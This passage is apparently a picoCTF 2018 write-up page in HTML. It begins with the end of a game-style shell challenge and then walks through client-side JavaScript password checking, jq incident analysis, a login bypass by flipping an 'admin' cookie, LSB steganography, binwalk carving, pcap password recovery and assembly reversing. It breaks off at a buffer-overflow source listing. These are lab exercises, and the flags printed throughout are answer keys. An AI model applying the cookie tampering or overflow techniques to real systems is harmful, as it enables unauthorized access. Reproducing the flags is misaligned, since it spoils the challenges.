profile_bah9Ech9oa4xaicohphahfaiG
profile_ie7sheiP7su2At2ahw6iRikoe
profile_of0Nee4laith8odaeLachoonu
profile_poh9eij4Choophaweiwev6eev

Sabatoge them! Get rid of all their intel files!

~/secret<span class="nv">$ </span><span class="nb">rm </span>intel<span class="k">*</span>

Nice! Once they are all gone, I think I can drop you a file of an exploit!
Just <span class="nb">type</span> <span class="s2">"echo 'Drop it in!' "</span> and we can give it a whirl!

~/secret<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Drop it in!"</span>
Drop it <span class="k">in</span><span class="o">!</span>
I placed a file <span class="k">in </span>the executables folder as it looks like the only place we can execute from!

Run the script I wrotec to have a little more impact on the system!
~/secret<span class="nv">$ </span><span class="nb">cd</span> ..
~/<span class="nv">$ </span><span class="nb">cd </span>executables
~/executables<span class="nv">$ </span>./dontLookHere
 0f5d ae3d 4183 37ae 3184 3f11 68e0 53af dbfd 7cd4 41fe 2b13 a3ef d071 54a9 f6b8 6535 5ebf a899 2136 4bbb 21cb 5088 031c f7e7
 818c ee94 3199 0366 b774 3452 13ea fa0a ae8f 9ec7 ad8b 34e5 7c6b 3ad2 e2a1 6aa6 4460 c455 2373 dcda 70b3 9c2b 0129 81e1 1c7e
 156e 74da 51f4 7a24 0ac8 6cc8 f3e3 b474 aa69 2e04 0373 1b16 ab8d ca36 4d48 9b36 cb31 bab3 b6f6 a59f 57ed 6d7a 0431 a520 c983
 343d c6e3 885f 9b32 d60d 4b67 cb7f 451d 230f 0e4d 5ed7 d58b cd59 cc8e d173 4adc 272a 3dc5 05f6 a076 9697 1949 d825 7821 b36e
 9fc4 58e8 a075 c5be 3517 dc17 fbd4 1fe2 5ece b992 b8e4 3618 bff6 3cb5 8fcd 3815 4364 055a 6143 be13 f771 e2aa 4766 e72c 19a3
 849c 26a4 c62d 8064 3691 9182 f357 8dd6 99b3 6d31 cda8 86cb 7eed 235c dd33 a4e6 8763 674d ea07 fdd9 b84a 32b5 7280 99f2 e920
 156b a1b3 d695 ffb2 25da e2bb dae5 6ec2 7990 a94e b6a4 c8d2 47ab 3c4b d945 834c cb19 d49d 4bf0 34a9 f79a 4a4f d87f 6c4d 6c2f
 79da a7d1 ce79 ec8d b33e 5a3d 5fcf 2ef4 3bbc eb2c 55cb 0278 6eb6 63af 063a 82cb ce55 7841 904b aabe 291c c69f 1311 e985 e8ee
 eee0 22bc 41e9 df14 d174 e9c2 7930 686e 6691 73c4 6ff9 2d37 821c 3d4c 7b6a 0321 a243 edc5 1c73 f4a0 4417 5d45 a59a 027f db2c
 88c2 2cca ca38 2361 9a06 5e73 b532 902d b485 f711 4856 c428 ff30 a40c 27ac 2849 ac67 b7a0 5cc2 3f7b a716 3cb1 eb28 a1ec 49c9
 ef0a e38f 7c8a a1b3 dddd 26cf 56bf b8f2 e0c9 d37d 6849 c6bf 2a6a d5b3 91ba 3b18 f522 7857 7393 5124 3c18 abd3 30ed 4766 9b82
 523f 5524 5243 1c79 3e4c 82ea f4d2 e420 2d13 8571 a4dd 4bb7 4eb1 0d27 7a00 e2d0 2440 b821 b576 778f c6eb 27b8 d95d c2a9 e7b1
 187a 1a10 dcbd d8c1 d1b8 6881 92e1 b9d9 6194 1e41 c9a7 080a 031c eba7 83f0 5e11 3d86 41a2 4c56 4726 ac14 ffbe 697c 086c 5bd7
 ff07 68ee 1b14 e8ad 9306 d353 4b3d f5b4 36cb 720a 8bd3 5d6c fc78 2330 3cb8 2b2d bf47 229f 9cc9 9bba 1e02 eb5f 2cf0 1974 d987
 0193 7884 482c 0f53 b2bf 4390 c4de df00 8a1d 71cb 5413 3172 a90e aee1 9ac2 a5e2 3912 183d 2856 7d55 ec4b 117f 0e1f 3ad5 dd6e
 5064 98d6 a3bd 2b92 c8b7 9f34 1f9d 8fa8 9dff 1af9 435d 4c3f a30e 3dc1 2137 56c2 8454 a0eb 6cc8 48a1 0b9a af06 3a83 f38d bbe0
 dea0 4374 118b b79f 2487 1086 1ca8 6fee 7187 e70c 697b a5bb d0ee b0a3 125e 7a99 1dc1 cc1e 98cc ce69 0519 4b67 7723 ef3b 8cc1
 d7f1 1480 8564 43d3 78f0 c705 5af1 1d77 b52e 681c 9f34 e967 6861 fb47 a502 b8d1 8057 5b6f db48 2731 4d0e 3bcc 5492 a03e 544d
 1d78 a5bc e79e 0489 c718 419d c182 28cc 86c2 2d11 d48a c372 fe62 13a4 0948 61aa 1d10 0fa1 4ebd 31ab e3b2 e4e0 b047 b002 9311
 d3ea ae07 7043 bd32 f4f3 58ca 841e 1c08 41e1 8dc3 e535 66e6 61fd 2004 085b 6258 58bc 12d4 5faa 31a4 b615 992a 2fc7 2950 8834
 77c5 4efb 1a1e 90b2 f9ca 27c4 8880 a6b0 a984 7b76 272c 64dd 4751 0ab9 ddb6 0fad ec5f 6a86 2f63 f69a ab62 9119 44ca acdd 7e12
 9020 e795 0096 4168 c7ae ecb0 0b40 ba3a fc2c 8d9f ee51 60b0 9720 6d4d a073 d9d2 cd41 70e3 36b1 e746 54a8 6493 11b1 9482 ac0a
 d7dd c7d2 49bc 4f81 48db 9975 788f a27e 371f 9102 df89 7215 b28f b18f d8f2 78ef db1b 05b7 5f2a 37b3 37e1 07d4 5ff0 677d b4b4
 8c05 f00a f01b d99a a29d 96a4 0028 b5b2 6c2c f20b 84e7 06cf 7c02 0ac8 cbf4 dcfa 6cf6 18f2 ca72 2def 232b 34f1 1416 d00c f337
 30ac 37de 97c0 c751 516d 01f0 9d33 0782 22ad 31dc 0775 697f 9956 58d0 dd2f 9158 4aa8 05d2 5a99 71a4 94ad a3b9 f782 e9c3 d93e
 0b35 578d 6707 d2b8 da62 f119 0af6 4579 37e7 90a6 0215 3b41 5984 7644 af07 111d a872 f09c 5bd3 2f92 4568 e6ef 1521 d977 42e4
 7342 5288 afa2 8884 ad9f 5768 70a8 7f9c b9e5 b5fe 1c8c 6872 fbad 6c2b f2b7 a36c ef0f ef92 56c1 9fea e070 d8d8 df14 09b7 4fc4
 16d4 ae3e 7f34 c054 28ac 7d2d f9b6 e324 ef3f dbc7 4dd9 6cd8 85bd 90f5 e70d 7830 4847 3a73 c450 a4e7 dea3 eaba 5f83 de6a bd65
 b061 9ac8 f5b1 d832 f4ad a162 56ad 6b1b 4d25 c2e8 e56c d10b c559 19ad dc32 877d d558 ee31 e430 94d4 b673 3a53 6689 8bad 98b3
 4536 f64c 53cf a6e4 d321 50b8 7545 081a 45ef 9727 5775 79b3 a3a4 624d 8afa 83dc 4aed 18f5 f358 ebb6 c573 24d8 5df3 17a7 2d6d
 9364 2a31 18ad dadc 7cfb e1f5 227d e199 dcc7 b4b5 9abf 4883 aced 7ce3 a6ef a5b4 0ba0 5689 8e2f 6a1b 508d 2347 ba7f 7fee debf
 6db5 e442 9a0e 3429 fc88 2584 51d3 3cac 2599 a20a d00d 9e2b 4a4b 3bd6 fc35 3bd2 f934 75d3 c1c2 aa40 79f8 46c0 9b53 e076 9ea6
 f0ef a335 1427 17e4 fb71 cf0c d459 a1f7 68f7 2981 82d1 b8a9 169f 9dee bcc3 a074 c4e3 e700 c6f7 bb67 baef 2d0a ebe4 2036 ffc5
Looking through the text above, I think I have found the password. I am just having trouble with a username.

Oh drats! They are onto us! We could get kicked out soon!

Quick! Print the username to the screen so we can close are backdoor and log into the account directly!

You have to find another way other than <span class="nb">echo</span><span class="o">!</span>
~/executables<span class="nv">$ </span><span class="nb">whoami
</span>l33th4x0r
Perfect! One second!

Okay, I think I have got what we are looking <span class="k">for</span><span class="nb">.</span> I just need to to copy the file to a place we can read.
Try copying the file called TopSecret <span class="k">in </span>tmp directory into the passwords folder.
~/executables<span class="nv">$ </span>: <span class="nb">command </span>not found or invalid
~/executables<span class="nv">$ </span><span class="nb">ls
</span>dontLookHere
~/executables<span class="nv">$ </span><span class="nb">cp</span> /tmp/TopSecret /passwords
~/executables<span class="nv">$ </span><span class="nb">cd</span> ../
../: directory not found or permitted
~/executables<span class="nv">$ </span><span class="nb">ls
</span>dontLookHere
~/executables<span class="nv">$ </span><span class="nb">cd</span> ..
~/<span class="nv">$ </span><span class="nb">cp</span> /tmp/TopSecret passwords
Server shutdown <span class="k">in </span>10 seconds...
Quick! go <span class="nb">read </span>the file before we lose our connection!
~/<span class="nv">$ </span><span class="nb">cd </span>passwords
~/passwords<span class="nv">$ </span><span class="nb">ls
</span>TopSecret
~/passwords<span class="nv">$ </span><span class="nb">cat </span>TopSecret
Major General John M. Schofield<span class="s1">'s graduation address to the graduating class of 1879 at West Point is as follows: The discipline which makes the soldiers of a free country reliable in battle is not to be gained by harsh or tyrannical treatment.On the contrary, such treatment is far more likely to destroy than to make an army.It is possible to impart instruction and give commands in such a manner and such a tone of voice as to inspire in the soldier no feeling butan intense desire to obey, while the opposite manner and tone of voice cannot fail to excite strong resentment and a desire to disobey.The one mode or other of dealing with subordinates springs from a corresponding spirit in the breast of the commander.He who feels the respect which is due to others, cannot fail to inspire in them respect for himself, while he who feels,and hence manifests disrespect towards others, especially his subordinates, cannot fail to inspire hatred against himself.
picoCTF{CrUsHeD_It_4e355279}
</span></pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="web-exploitation-150-client-side-is-still-bad"> Web Exploitation 150: Client Side is Still Bad <a href="/CTF-writeups-public/writeups/PicoCTF_2018/18-web-exploitation-150-client-side-is-still-bad.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> I forgot my password again, but this time there doesn’t seem to be a reset,<br /> can you help me? http://2018shell1.picoctf.com:53990 (link)</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we check the source</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Super Secure Log In<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"#000000"</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- standard MD5 implementation --&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"md5.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
  <span class="kd">function</span> <span class="nf">verify</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">checkpass</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">pass</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
    <span class="nx">split</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="o">*</span><span class="mi">7</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">}</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">0594</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="o">*</span><span class="mi">5</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">d_04</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">s_ba</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">nt_i</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">clie</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">split</span><span class="p">,</span> <span class="nx">split</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">CTF{</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">checkpass</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">split</span><span class="p">)</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">pico</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">You got the flag!</span><span class="dl">"</span><span class="p">)</span>
                  <span class="p">}</span>
                <span class="p">}</span>
              <span class="p">}</span>

            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Incorrect password</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:red"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"text-align:center"</span><span class="nt">&gt;</span>
<span class="nt">&lt;p&gt;</span>Welcome to the Secure Login Server.<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>Please enter your credentials to proceed<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"index.html"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">id=</span><span class="s">"pass"</span> <span class="na">size=</span><span class="s">"8"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Log in"</span> <span class="na">onclick=</span><span class="s">"verify(); return false;"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{client_is_bad_040594} </code><hr><h1 id="forensics-150-desrouleaux"> Forensics 150: Desrouleaux <a href="/CTF-writeups-public/writeups/PicoCTF_2018/19-forensics-150-desrouleaux.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Our network administrator is having some trouble handling the tickets for all of of our incidents. Can you help him out by answering all the questions? Connect with nc 2018shell1.picoctf.com 40952.</p><p><strong>Solution</strong><br /> The <a href="./writeupfiles/incidents.json">incidents.json</a> is a pretty small file surprisingly, everything is accomplished with <code class="language-plaintext highlighter-rouge">jq</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ nc 2018shell1.picoctf.com 40952
You'll need to consult the file `incidents.json` to answer the following questions.
What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.
99.32.28.173

Correct!

How many unique destination IP addresses were targeted by the source IP address 99.32.28.173?
3

Correct!

What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.
1.67

Correct!

Great job. You've earned the flag: picoCTF{J4y_s0n_d3rUUUULo_b6cacd6c}
</pre></table></code></div></div><h2 id="question2"><span class="mr-2">Question2</span><a href="#question2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>$ cat incidents.json | jq .tickets[].src_ip -r | sort | uniq -c | sort -n | tail -n 1
$ cat incidents.json | jq '.tickets[] | select(.src_ip == "99.32.28.173")'
$ cat incidents.json | jq -r '.tickets[] | [.file_hash, .dst_ip] | @tsv' | sort
336033417a7364f0        230.124.77.62
336033417a7364f0        231.208.216.227
65a8826931637d74        230.124.77.62
65a8826931637d74        23.245.63.105
811f58a6e15c0643        120.119.119.83
811f58a6e15c0643        215.51.6.131
b03dee2273112d13        107.111.202.130
b03dee2273112d13        230.124.77.62
bbd65e44921b880c        247.145.101.4
dfd6f5d416878f69        231.208.216.227
</pre></table></code></div></div><h2 id="answer"><span class="mr-2">Answer</span><a href="#answer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>2+2+2+2+1+1 / 6 = 1.67 (6 different hashes, 4 of them got sent to 2 unique IPs, 2 of them just 1, average is 1.67)</p><h2> Flag</h2><code> picoCTF{J4y_s0n_d3rUUUULo_b6cacd6c} </code><hr><h1 id="web-exploitation-150-logon"> Web Exploitation 150: Logon <a href="/CTF-writeups-public/writeups/PicoCTF_2018/20-web-exploitation-150-logon.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I made a website so now you can log on to! I don’t seem to have the admin password. See if you can’t get to the flag. http://2018shell1.picoctf.com:57252 (link)</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It only checks password for user <code class="language-plaintext highlighter-rouge">admin</code>. We can log in as any other username, then get 3 cookies:</p><p>We change <code class="language-plaintext highlighter-rouge">admin</code> cookie to <code class="language-plaintext highlighter-rouge">True</code> and refresh the page to get the flag</p><h2> Flag</h2><code> picoCTF{l0g1ns_ar3nt_r34l_2a968c11} </code><hr><h1 id="forensics-150-reading-between-the-eyes"> Forensics 150: Reading between the Eyes <a href="/CTF-writeups-public/writeups/PicoCTF_2018/21-forensics-150-reading-between-the-eyes.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Stego-Saurus hid a message for you in this image, can you retreive it?</p><p><img src="writeupfiles/husky.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If we extract the LSB of each channel, we see something hidden in the first row of pixels</p><p><img src="writeupfiles/husky_lsb_r.png" alt="" /><br /> <img src="writeupfiles/husky_lsb_g.png" alt="" /><br /> <img src="writeupfiles/husky_lsb_b.png" alt="" /></p><p>in textual format:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>r: 01011110 00110101 00111110 01100011 01011011 01110010 01110110 01111001 01111010 01110010 01100110 0100000000000000000..
g: 10010001 11100010 10010011 00111000 00111001 11110011 00111011 00111011 00110011 11110010 00110011 1110000000000000000..
b: 10000101 11001100 01011100 10010100 10001101 01001001 11011001 10001111 11000001 01001111 11011101 1100000000000000000..
</pre></table></code></div></div><p>hmm, this doesnt look like it encodes ascii ..what now?</p><p>Let’s think about what we know about the text that is hidden:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>picoCTF{ : 01110000 01101001 01100011 01101111 01000011 01010100 01000110 01111011
</pre></table></code></div></div><p>Aha! so the three channels are interlaced! the full string becomes:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>0111000001101001011000110110111101000011010101000100011001111011011100100011001100110100011
0010000110001011011100110011101011111011000100011001100110111011101110011001100110011011011
100101111100110111011010000011001101011111011000100111100100110111001100110111001101111101
</pre></table></code></div></div><p>and translates to our flag</p><h2> Flag</h2><code> picoCTF{r34d1ng_b37w33n_7h3_by73s} </code><hr><h1 id="forensics-150-recovering-from-the-snap"> Forensics 150: Recovering from the snap <a href="/CTF-writeups-public/writeups/PicoCTF_2018/22-forensics-150-recovering-from-the-snap.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There used to be a bunch of <a href="writeupfiles/animals">animals</a> here, what did Dr. Xernon do to them?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>binwalk animals.dd

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
39424         0x9A00          JPEG image data, JFIF standard 1.01
39454         0x9A1E          TIFF image data, big-endian, offset of first image directory: 8
672256        0xA4200         JPEG image data, JFIF standard 1.01
1165824       0x11CA00        JPEG image data, JFIF standard 1.01
1556992       0x17C200        JPEG image data, JFIF standard 1.01
1812992       0x1BAA00        JPEG image data, JFIF standard 1.01
1813022       0x1BAA1E        TIFF image data, big-endian, offset of first image directory: 8
2136576       0x209A00        JPEG image data, JFIF standard 1.01
2136606       0x209A1E        TIFF image data, big-endian, offset of first image directory: 8
2607616       0x27CA00        JPEG image data, JFIF standard 1.01
2607646       0x27CA1E        TIFF image data, big-endian, offset of first image directory: 8
3000832       0x2DCA00        JPEG image data, JFIF standard 1.01
3000862       0x2DCA1E        TIFF image data, big-endian, offset of first image directory: 8

<span class="nv">$ </span>binwalk <span class="nt">--dd</span><span class="o">=</span><span class="s1">'jpeg:jpg'</span> animals.dd
</pre></table></code></div></div><p>this gave us a bunch of animal images, and one image with the flag:</p><p><img src="writeupfiles/animalsflag.jpg" alt="" /></p><h2> Flag</h2><code> picoCTF{th3_5n4p_happ3n3d} </code><hr><h1 id="forensics-150-admin-panel"> Forensics 150: admin panel <a href="/CTF-writeups-public/writeups/PicoCTF_2018/23-forensics-150-admin-panel.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We captured some traffic logging into the admin panel, can you find the password?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>They’ve provided a <a href="./writeupfiles/data.pcap">pcap file</a>, there’s a POST to<br /> /login which looks obvious. Following the stream as HTTP shows the password<br /> quite clearly.</p><h2> Flag</h2><code> picoCTF{n0ts3cur3_894a6546} </code><hr><h1 id="reversing-150-assembly-0"> Reversing 150: assembly-0 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/24-reversing-150-assembly-0.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What does <code class="language-plaintext highlighter-rouge">asm0(0xd8,0x7a)</code> return? Submit the flag as a hexadecimal value (starting with <code class="language-plaintext highlighter-rouge">0x</code>).</p><p>NOTE: Your submission for this question will NOT be in the normal flag format. <a href="writeupfiles/intro_asm_rev.S">Source</a><br /> located in the directory at <code class="language-plaintext highlighter-rouge">/problems/assembly-0_1_fc43dbf0079fd5aab87236bf3bf4ac63</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><pre><code class="language-asm">.intel_syntax noprefix
.bits 32

.global asm0

asm0:
	push	ebp
	mov	ebp,esp
	mov	eax,DWORD PTR [ebp+0x8]
	mov	ebx,DWORD PTR [ebp+0xc]
	mov	eax,ebx
	mov	esp,ebp
	pop	ebp
	ret
</code></pre><p>we can deduce the output manually. <code class="language-plaintext highlighter-rouge">ret</code> will return the value of <code class="language-plaintext highlighter-rouge">eax</code>, which was set to the value of <code class="language-plaintext highlighter-rouge">ebx</code> (<code class="language-plaintext highlighter-rouge">mov eax ebx</code>), and ebx was set do the second argument we passed to the program (<code class="language-plaintext highlighter-rouge">mov ebx,DWORD PTR [ebp+0xc]</code>), which in this case was <code class="language-plaintext highlighter-rouge">0x7a</code></p><h2> Flag</h2><code> unsolved </code><hr><h1 id="binary-exploitation-150-buffer-overflow-0"> Binary Exploitation 150: buffer overflow 0 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/25-binary-exploitation-150-buffer-overflow-0.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s start off simple, can you overflow the right buffer in this <a href="writeupfiles/vuln">program</a> to get the flag?<br /> You can also find it in <code class="language-plaintext highlighter-rouge">/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631</code> on the shell server.</p><p><a href="writeupfiles/vuln.c">Source</a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span>
<span class="cp">#define FLAGSIZE_MAX 64
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="n">FLAGSIZE_MAX</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">sigsegv_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
